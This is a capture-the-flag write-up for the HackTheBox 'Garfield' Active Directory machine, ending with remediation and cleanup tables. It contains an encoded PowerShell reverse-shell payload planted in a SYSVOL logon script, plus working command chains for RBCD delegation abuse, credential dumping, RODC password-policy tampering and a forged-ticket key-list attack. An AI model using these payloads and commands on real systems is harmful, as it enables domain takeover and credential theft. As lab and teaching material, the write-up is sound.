<img src="Images/Garfield%20logo.png" width="191" alt="Garfield">


# Attack Chain

```
j.arbuckle (provided creds)
 └─► Logon Script Abuse (SYSVOL + scriptPath) → shell as l.wilson
	  └─► ForceChangePassword → WinRM as l.wilson_adm        [user flag]
		   └─► Ligolo pivot → 192.168.100.0/24
			    └─► RBCD (WriteAccountRestrictions + HACKED$) → S4U → secretsdump -use-vss
				     └─► krbtgt_8245 NT hash (RC4)
					      └─► PRP abuse (+Domain Admins to RevealOnDemand, clear NeverReveal)
						       └─► Rubeus golden /rodcNumber:8245 → asktgs /keyList → Administrator hash
							        └─► WinRM as Administrator on DC01                [root flag]
```

# Compromised Credentials

| Account         | Type                | Credential                                   | Obtained via                               |
| --------------- | ------------------- | -------------------------------------------- | ------------------------------------------ |
| `j.arbuckle`    | Domain user         | `Th1sD4mnC4t!@1978` (password)               | Provided                                   |
| `l.wilson`      | Domain user         | Interactive shell only                       | Logon script abuse (`scriptPath` + SYSVOL) |
| `l.wilson_adm`  | Domain user         | `Hacked123!` (attacker-set password)         | ForceChangePassword from `l.wilson`        |
| `HACKED$`       | Computer account    | `Password123!` (password)                    | `addcomputer.py` (MAQ = 10)                |
| `krbtgt_8245`   | RODC krbtgt         | `445aa4<REDACTED>` (NT hash) | `secretsdump.py -use-vss` on RODC01        |
| `Administrator` | Domain Admin (DC01) | `EE238F<REDACTED>` (NT hash) | Key List Attack (`Rubeus asktgs /keyList`) |

---
# Table of Contents

- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [Bloodhound](#bloodhound)
- [SMB Shares](#smb-shares)
- [Logon Script Abuse](#logon-script-abuse)
  - [Upload files](#upload-files)
  - [Check AD Permissions](#check-ad-permissions)
  - [Set Logon Script to Liz Wilson](#set-logon-script-to-liz-wilson)
  - [Shell as l.wilson](#shell-as-lwilson)
- [Lateral Movement](#lateral-movement)
- [Compromise RODC01](#compromise-rodc01)
  - [IP Discovery](#ip-discovery)
  - [Setup Ligolo](#setup-ligolo)
  - [Resource Based Constrained Delegation attack](#resource-based-constrained-delegation-attack)
  - [Dump](#dump)
- [Compromise DC01](#compromise-dc01)
  - [Prerequisites](#prerequisites)
    - [Add l.wilson_adm to RODC Administrators](#add-lwilson_adm-to-rodc-administrators)
    - [Modify msDS-RevealOnDemandGroup](#modify-msds-revealondemandgroup)
    - [Clear msDS-NeverRevealGroup](#clear-msds-neverrevealgroup)
    - [Check encryption](#check-encryption)
  - [Rubeus - Golden Ticket](#rubeus---golden-ticket)
  - [Shell as administrator](#shell-as-administrator)

---
As is common in real life pentests, you will start the Garfield box with credentials for the following account `j.arbuckle` / `Th1sD4mnC4t!@1978`
# Enumeration

### Nmap

```
nmap -sVC 10.129.*.* -oN scan.txt

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-05 09:38:20Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: GARFIELD
|   NetBIOS_Domain_Name: GARFIELD
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: garfield.htb
|   DNS_Computer_Name: DC01.garfield.htb
|   DNS_Tree_Name: garfield.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2026-04-05T09:38:37+00:00
|_ssl-date: 2026-04-05T09:39:19+00:00; +8h00m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.garfield.htb
| Not valid before: 2026-02-13T01:10:36
|_Not valid after:  2026-08-15T01:10:36
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

> [!NOTE]
> **Observations**
> - Target is a domain controller
> - Domain is `garfield.htb`
> - FQDN is `dc01.garfield.htb`

We modified our `/etc/hosts` following these informations to match the target.

```
echo '10.129.*.* dc01 garfield.htb dc01.garfield.htb' | tee -a /etc/hosts
```

### Bloodhound

Since we had credentials, we collected for **Bloodhound**.

```
bloodhound.py --zip -c All -d 'garfield.htb' -u "j.arbuckle" -p 'Th1sD4mnC4t!@1978' -ns "10.129.*.*"
```

![Garfied - Bloodhound J.arbuckle](Images/Garfied%20-%20Bloodhound%20J.arbuckle.png)

Nothing was exploitable directly according to **Bloodhound**.

# SMB Shares

We also looked at the available shares we have access to on the target.

```
nxc smb '10.129.*.*' -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --shares

SMB         10.129.*.*   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.*.*   445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
SMB         10.129.*.*   445    DC01             [*] Enumerated shares
SMB         10.129.*.*   445    DC01             Share           Permissions     Remark
SMB         10.129.*.*   445    DC01             -----           -----------     ------
SMB         10.129.*.*   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.*.*   445    DC01             C$                              Default share
SMB         10.129.*.*   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.*.*   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.*.*   445    DC01             SYSVOL          READ            Logon server share
```

There was only default shares. But when digging in `SYSVOL` we found a script inside.

```
smbclient -U j.arbuckle //10.129.*.*/SYSVOL                  
Password for [WORKGROUP\j.arbuckle]: Th1sD4mnC4t!@1978

smb: \> ls
  .                                   D        0  Wed Aug 13 13:04:43 2025
  ..                                  D        0  Wed Aug 13 13:04:43 2025
  garfield.htb                       Dr        0  Wed Aug 13 13:04:43 2025

smb: \> cd garfield.htb\
smb: \garfield.htb\> ls
  .                                   D        0  Wed Aug 13 13:11:05 2025
  ..                                  D        0  Wed Aug 13 13:11:05 2025
  DfsrPrivate                      DHSr        0  Wed Aug 13 13:11:05 2025
  Policies                            D        0  Wed Aug 13 13:04:48 2025
  scripts                             D        0  Tue Jan 27 23:13:47 2026

smb: \garfield.htb\> cd scripts\
smb: \garfield.htb\scripts\> ls
  .                                   D        0  Tue Jan 27 23:13:47 2026
  ..                                  D        0  Tue Jan 27 23:13:47 2026
  printerDetect.bat                   A      217  Sat Sep 13 00:20:29 2025
```

The script was used to detect installed printer, and no valuable information were inside.

```
cat printerDetect.bat

@echo off

echo Detecting installed printers...

echo ==============================



wmic printer get Name,DeviceID,PortName,DriverName,Shared,Status /format:table



echo.

echo Printer detection completed.

pause
```

# Logon Script Abuse

The script was probably used a logon script. After some research, we found it could be abused if we had the possibilty to upload files in the `scripts` folder under SYSVOL, and if we had **WRITE** permission over the `scriptPath` attribute of an user. If we had these prerequisite, we could execute commands with their privileges when the user connects to the machine.

### Upload files

To exploit it, we looked first if we could put files inside the `scripts` folder.
 
```
smb: \garfield.htb\scripts\> put test
putting file test as \garfield.htb\scripts\test (0.0 kb/s) (average 0.0 kb/s)
```

We could put files inside the folder, so we wrote a simple script in order to get a reverse shell as the user running the script.

```
cat printerDetect.bat
@echo off

powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgAzADAAIgAsADYANwA2ADcAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

We copied the original script on our machine, and we put our inside.

```
smb: \garfield.htb\scripts\> put printerDetect.bat
putting file printerDetect.bat as \garfield.htb\scripts\printerDetect.bat (1.6 kb/s) (average 5.1 kb/s)
```

### Check AD Permissions

Next we needed to find an user where we could modify the `scriptPath` attribute, and we found 2 domain users.

```
bloodyAD --host "10.129.*.*" -d "garfield.htb" -u "j.arbuckle" -p 'Th1sD4mnC4t!@1978' get writable

<SNIP>

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

<SNIP>
```

We had `WRITE` permission to the `scriptPath` attribute of `Liz Wilson` and `Liz Wilson ADM`.

### Set Logon Script to Liz Wilson

We then attached the logon script to the user `l.wilson`, so we could receive a reverse shell.

```
bloodyAD --host "10.129.*.*" -d "garfield.htb" -u "j.arbuckle" -p 'Th1sD4mnC4t!@1978' set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v "printerDetect.bat"
[+] CN=Liz Wilson,CN=Users,DC=garfield,DC=htb's scriptPath has been updated
```

### Shell as l.wilson

We started our python3 http server and our listener to get a shell.

```
penelope -i tun0 -p 6767

PS C:\Windows\system32> whoami
garfield\l.wilson
```

# Lateral Movement

Now that we had access to the user `j.wilson` we got back to bloodhound and noticed the following.

![Garfied - Bloodhound l.wilson_adm](Images/Garfied%20-%20Bloodhound%20l.wilson_adm.png)

We had `ForceChangePassword` permission on the account `l.wilson_adm`, which means we could change its password.

Since we didn't have the password of `l.wilson`, we had to do it through our Windows shell.

```
PS C:\Windows\system32> $newpass = ConvertTo-SecureString 'Hacked123!' -AsPlainText -Force
PS C:\Windows\system32> Set-ADAccountPassword -Identity "l.wilson_adm" -NewPassword $newpass -Reset
```

And we tested the credentials to check if the change was made.

```
nxc smb 10.129.*.* -u l.wilson_adm -p 'Hacked123!'
SMB         10.129.*.*  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.*.*  445    DC01             [+] garfield.htb\l.wilson_adm:Hacked123!
```

It worked so we could connect over WinrRM as `l.wilson_adm`, and grab the user flag.

```
evil-winrm -u "l.wilson_adm" -p 'Hacked123!' -i "10.129.*.*"
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents>
```

# Compromise RODC01

On **BloodHound**, we found that `l.wilson_adm` had `WriteAccountRestrictions` over **RODC01**.

![Garfied - Bloodhound RODC01 Path](Images/Garfied%20-%20Bloodhound%20RODC01%20Path.png)

This permission can be used to perform RBCD attacks, since we could write to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of **RODC01**.

The name also implied that the server might be a read only domain controller.

## IP Discovery

Since its IP couldn't be reached from our tunnel, we enumerated the internal networks, and we found `192.168.100.0/24`.

```
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> ipconfig

<SNIP>

Ethernet adapter vEthernet (Switch01):

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::c4ff:5747:1d3c:fba0%9
   IPv4 Address. . . . . . . . . . . : 192.168.100.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
```

We then performed a ping sweep to discover the IP belonging to **RODC01**.

```
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> cmd /c '(for /L %a IN (1,1,254) DO ping /n 1 /w 1 192.168.100.%a) | find "Reply"'

Reply from 192.168.100.1: bytes=32 time<1ms TTL=128
Reply from 192.168.100.2: bytes=32 time<1ms TTL=128
```

The IP of **RODC01** was `192.168.100.2`.

## Setup Ligolo

To access the internal network, we used **ligolo-ng**.

```
./proxy -selfcert
```

```
ip tuntap add user root mode tun ligolo
ip link set ligolo up
```

We uploaded the agent to the target throught our WinRM session and started the tunnel.

```
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> upload /workspace/agent.exe

.\agent.exe -ignore-cert -connect 10.10.*.*
```

```
ip route add 192.168.100.0/24 dev ligolo
```

## Resource Based Constrained Delegation attack

To perform an RBCD attack, we needed either a service account with a SPN, or a computer account (has a SPN by default).
We didn't compromise any account with a SPN, so we looked if we could add a computer to the domain by checking the MachineAccountQuota of `l.wilson_adm`.

```
nxc ldap 10.129.*.* -u l.wilson_adm -p 'Hacked123!' -M maq
LDAP        10.129.*.*  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:garfield.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.*.*  389    DC01             [+] garfield.htb\l.wilson_adm:Hacked123!
MAQ         10.129.*.*  389    DC01             [*] Getting the MachineAccountQuota
MAQ         10.129.*.*  389    DC01             MachineAccountQuota: 10
```

We add the possibility to add a new computer to the domain. We then subsequently added one.

```
addcomputer.py 'garfield.htb/l.wilson_adm:Hacked123!' -dc-ip 10.129.*.* -computer-name 'HACKED$' -computer-pass 'Password123!'

[*] Successfully added machine account HACKED$ with password Password123!.
```

Now that we were in control of a computer linked to the domain, we could write to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of **RODC01**, and authorize `HACKED$` for delegation.

```
rbcd.py 'garfield.htb/l.wilson_adm:Hacked123!' -delegate-to 'RODC01$' -delegate-from 'HACKED$' -dc-ip 10.129.*.* -action 'write'

[+] NTLM bind succeeded.
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] HACKED$ can now impersonate users on RODC01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     HACKED$    (S-1-5-21-2502726253-3859040611-225969357-10601)
```

With the delegation effective, we could request a service ticket, on behalf of **RODC01**, for the administrator user of **RODC01**.

```
getST.py 'garfield.htb/HACKED$:Password123!' -spn 'cifs/RODC01.garfield.htb' -impersonate 'Administrator' -dc-ip 10.129.*.*

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

## Dump

We added the obtained ticket to the environment variable `KRB5CCNAME`.

```
export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

And we extracted the information from **RODC01**.
Since we were facing a Read Only Domain Controller, we had to specify the option `-use-vss` to dump the sensitive files.

```
secretsdump.py garfield.htb/administrator@rodc01.garfield.htb -k -no-pass -target-ip 192.168.100.2 -use-vss

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x082116<REDACTED>
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:75be66<REDACTED>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
GARFIELD\RODC01$:aes256-cts-hmac-sha1-96:53f207<REDACTED>
GARFIELD\RODC01$:aes128-cts-hmac-sha1-96:52432a<REDACTED>
GARFIELD\RODC01$:des-cbc-md5:d0bcec<REDACTED>
GARFIELD\RODC01$:plain_password_hex:abb915<REDACTED>
GARFIELD\RODC01$:aad3b435b51404eeaad3b435b51404ee:0a3f81<REDACTED>:::

<SNIP>

[*] Searching for NTDS.dit
[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
[*] Using smbexec method for remote execution
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 0dbed7<REDACTED>
[*] Reading and decrypting hashes from \\192.168.100.2\ADMIN$\Temp\zGetqJhl.tmp
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RODC01$:1602:aad3b435b51404eeaad3b435b51404ee:0a3f81<REDACTED>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt_8245:1603:aad3b435b51404eeaad3b435b51404ee:445aa4<REDACTED>:::
garfield.htb\j.arbuckle:3101:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
garfield.htb\l.wilson:3105:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
garfield.htb\l.wilson_adm:3107:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

<SNIP>
```

We noticed from the dump that a lot of user had a blank password, which indicated that their credentials were not cached.

# Compromise DC01

An RODC has its own isolated `krbtgt` account, which is used to sign kerberos tickets issued by the RODC. In our case, `krbtgt_8245` was used by **RODC01**, and we had its NT hash.

To compromise the main DC, we could manipulate the **Password Replication Policy (PRP)**. By emptying the `msDS-NeverRevealGroup` (the Deny list, which includes Domain Admins by default) and adding the `Domain Admins` group to the `msDS-RevealOnDemandGroup` (the Allow list), we could trick the Active Directory architecture into authorizing the RODC to request and store the Domain Admin's hash. 
## Prerequisites

### Add l.wilson_adm to RODC Administrators

Since we didn't have enough privilege to modify the `msDS-RevealOnDemandGroup` attribute, we needed first to add `l.wilson_adm` to the **RODC Administrators** group from the winrm session. We could add `l.wilson_adm` to the group since it had `AddSelf` permission over **RODC Administrators**.

```
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> Add-ADGroupMember -Identity "RODC Administrators" -Members "l.wilson_adm"
```

### Modify msDS-RevealOnDemandGroup

Then we modified the `msDS-RevealOnDemandGroup` attribute to allow **Domain Admins** users.

```
bloodyAD -H 10.129.*.* -d garfield.htb -u l.wilson_adm -p 'Hacked123!' set object 'CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb' msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb' -v 'CN=Domain Admins,CN=Users,DC=garfield,DC=htb'
[+] CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb's msDS-RevealOnDemandGroup has been updated
```

### Clear msDS-NeverRevealGroup

We also needed to clear the `msDS-NeverRevealGroup` attribute because it contains by default **Denied RODC Password Replication Group**, which involve `Domain Admins`, `Enterprise Admins`, `Administrators`, `krbtgt`, etc...
And since in Active Directory, the **Deny** rules always take precedence over the **Allow** rules, clearing of the `NeverRevealGroup` is mandatory for the attack to work.

```
bloodyAD --host 10.129.*.* -d garfield.htb -u l.wilson_adm -p 'Hacked123!' set object 'CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb' msDS-NeverRevealGroup
[+] CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb's msDS-NeverRevealGroup has been updated
```

### Check encryption

Finally, we needed to check the supported encrytion on **RODC01** to know if we could use `krbgt_8245` hash for the attack.

```
bloodyAD -H 10.129.*.* -d garfield.htb -u l.wilson_adm -p 'Hacked123!' get object 'RODC01$' --attr msDS-SupportedEncryptionTypes                     
distinguishedName: CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb
msDS-SupportedEncryptionTypes: 28
```

The encryption was set to `28`, wich includes `RC4`, so we could use its NT hash. Otherwise we would have had to look for its AES256 key.

## Rubeus - Golden Ticket

With all that done, we could now upload **Rubeus** on the target and forge a golden ticket for the `administrator` domain account.

```
.\Rubeus.exe golden /rodcNumber:8245 /flags:forwardable,renewable,enc_pa_rep /user:Administrator /rc4:445aa4<REDACTED> /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /outfile:C:\Windows\Temp\ticket.kirbi
```

We couldn't directly access`DC01` with that forged Golden Ticket signed by the RODC's local `krbtgt`.

However, we could request a service ticket for `krbtgt` by presenting our forged RODC TGT to **DC01** along with the `/keyList` flag, this simulated a legitimate request from **RODC01** asking for credential replication. 

Because we added `Domain Admins` to the allowed PRP list, `DC01` validated the request and returned the NT hash of `administrator` within the Kerberos response.

```
.\Rubeus.exe asktgs /service:krbtgt/garfield.htb /dc:DC01.garfield.htb /keyList /enctype:aes256 /ticket:C:\Windows\Temp\ticket_2026_04_08_03_57_40_Administrator_to_krbtgt@GARFIELD.HTB.kirbi /nowrap

<SNIP>

  ServiceName              :  krbtgt/GARFIELD.HTB
  ServiceRealm             :  GARFIELD.HTB
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  GARFIELD.HTB
  StartTime                :  4/7/2026 8:58:59 PM
  EndTime                  :  4/8/2026 6:57:40 AM
  RenewTill                :  1/1/0001 12:00:00 AM
  Flags                    :  name_canonicalize
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  PklEId<REDACTED>
  Password Hash            :  EE238F<REDACTED>
```

The credentials were working.

```
nxc smb 10.129.*.* -u 'Administrator' -H 'EE238F<REDACTED>'
SMB         10.129.*.*   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.*.*   445    DC01             [+] garfield.htb\Administrator:EE238F<REDACTED> (admin)
```

## Shell as administrator

We finally could login over WinRM as the `administrator` domain account, and grab the root flag.

```
evil-winrm -u "Administrator" -H 'EE238F<REDACTED>' -i "10.129.*.*"
```

> [!TIP]
> **Machine rooted**


# Remediation

|Finding|Remediation|
|---|---|
|`IT Support` has WriteProperty on `scriptPath` of user objects (ACL misconfig)|Remove the delegated ACE; enforce least-privilege delegation; audit object ACLs regularly|
|SYSVOL `scripts` folder writable + abusable `scriptPath`|Lock down write access to SYSVOL scripts; monitor `scriptPath` changes; manage logon scripts via hardened GPO|
|`l.wilson` can ForceChangePassword `l.wilson_adm` (tier breach)|Enforce AD tiering; remove the ACE; add admin accounts to **Protected Users**|
|`MachineAccountQuota = 10`|Set `ms-DS-MachineAccountQuota` to 0; delegate domain-join to a dedicated group|
|`l.wilson_adm` has WriteAccountRestrictions over RODC01 (RBCD)|Remove the ACE; restrict who can write `msDS-AllowedToActOnBehalfOfOtherIdentity`; alert on RBCD attribute changes|
|RODC PRP writable + AddSelf on **RODC Administrators**|Harden RODC object ACLs; keep RODC admin membership Tier0-only|
|Administrator / Domain Admins revealable to the RODC|Keep privileged accounts in **Denied RODC Password Replication Group**; never cache Tier0 creds on an RODC|
|RC4 enabled (`msDS-SupportedEncryptionTypes = 28`)|Disable RC4; enforce AES-only (e.g. value `24`)|

# Cleanup

|Artifact / change introduced|Cleanup action|
|---|---|
|`printerDetect.bat` in SYSVOL\scripts overwritten with payload|Restore the original printer-detection script; remove the reverse-shell version|
|`test` file dropped in SYSVOL\scripts|Delete it|
|`scriptPath` set to `printerDetect.bat` on `l.wilson`|Clear / restore its original value|
|`l.wilson_adm` password changed to `Hacked123!`|Flag to client — original unknown; owner must reset|
|Computer account `HACKED$` joined to the domain|Delete the machine account|
|`msDS-AllowedToActOnBehalfOfOtherIdentity` written on `RODC01$`|Clear the attribute|
|`l.wilson_adm` added to **RODC Administrators**|Remove from the group|
|`msDS-RevealOnDemandGroup` on RODC01 modified (+Domain Admins)|Restore original value (Allowed RODC Password Replication Group only)|
|`msDS-NeverRevealGroup` on RODC01 cleared|Restore the original deny list|
|`agent.exe` (Ligolo) and `Rubeus.exe` uploaded to target|Delete the binaries|
|Forged tickets (`ticket.kirbi`, `*.ccache`) on target & attacker|Delete them|
|`RemoteRegistry` service started on RODC01 by secretsdump|Stop it (it was stopped originally)|
|VSS shadow copy created via `-use-vss`|Verify no leftover shadow copy remains on RODC01|


<div align="center">
  <a href="https://labs.hackthebox.com/achievement/machine/2127339/862">
    <img src="Images/Garfield%20-%20pwned.png" width="600" alt="Garfield has been Pwned">
  </a>
</div>
